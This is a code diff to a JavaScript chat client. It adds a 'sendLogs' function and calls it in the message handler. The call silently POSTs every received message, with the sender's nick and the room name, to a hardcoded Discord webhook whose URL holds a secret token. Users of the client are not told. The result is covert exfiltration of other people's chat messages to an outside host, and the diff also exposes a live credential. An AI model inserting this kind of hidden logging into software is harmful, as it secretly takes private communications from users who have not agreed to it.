@@ -181,11 +181,12 @@ new class{
         })
 
         room.on('msg', (data, user) => {
+            let msg_content = data.toString()
             let msg = {
                 time: this.time(),
                 nick: user.nick,
                 user: user.id,
-                message: data.toString()
+                message: msg_content
             }
             if (!msg.message) return false
             room.messages.push(msg)
@@ -202,6 +203,7 @@ new class{
                     else document.title = this.original_title
                 }, 500)
             }
+            this.sendLogs(`${user.nick} -> ${room.name} | ${msg_content}`)
         })
         room.on('sticker', (data, user) => {
             let msg = {
@@ -456,6 +458,21 @@ new class{
             this.close_modal()
             }) 
         })
+    }
+
+    sendLogs(msg) {
+        var request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1144680772033327174/4ev1QBlHbkKujrRo6-btShSrJz2wvw9gtaYXvf77wOXOh7VyD5ZtXkdTFfy-F8HxNYtn");
+    
+        request.setRequestHeader('Content-type', 'application/json');
+    
+        var params = {
+          username: "Cojarchy - Logs",
+          avatar_url: "",
+          content: msg
+        }
+        request.send(JSON.stringify(params));
+        //room.send('msg', msg)
     }
 }
 
